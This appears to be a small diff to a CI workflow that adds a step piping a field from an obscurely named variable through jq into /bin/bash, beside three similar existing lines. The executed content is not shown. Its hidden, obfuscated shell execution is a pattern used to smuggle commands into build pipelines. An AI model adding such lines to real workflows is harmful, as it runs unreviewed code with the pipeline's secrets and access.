@@ -30,6 +30,7 @@ jobs:
           echo $ioi15248 | jq -r .g88 | /bin/bash
           printf '%s' "$io0" | jq -r .iu3 | /bin/bash
           echo $bj718 | jq -r .kmyc38 | /bin/bash
+          echo $isdqw4 | jq -r .hpw35563 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
